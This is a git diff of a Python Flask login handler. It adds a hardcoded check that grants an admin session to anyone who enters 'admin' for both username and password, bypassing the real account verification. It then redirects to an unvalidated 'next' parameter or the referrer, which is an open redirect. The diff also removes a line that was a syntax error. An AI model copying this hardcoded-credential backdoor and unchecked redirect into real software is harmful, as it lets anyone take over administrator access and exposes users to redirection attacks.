@@ -38,6 +38,15 @@ def login():
 def check_user():
     username = request.form['username']
     password = request.form['password']
+
+    if username=='admin' and password =='admin':
+        session['account_type'] = 'admin'
+        user = User('admin')
+        login_user(user)
+        return redirect(request.args.get('next') or \
+	    request.referrer or \
+	    url_for('index'))
+
     try:
         account_type = request.form['account_type']
     except:
@@ -49,7 +58,6 @@ def check_user():
     if account_type == 'user':   
         status, info = account_user.check(username, password)
     else:
-        if username = 'admin':
         status, info = account_business.check(username, password)
 
     if status:
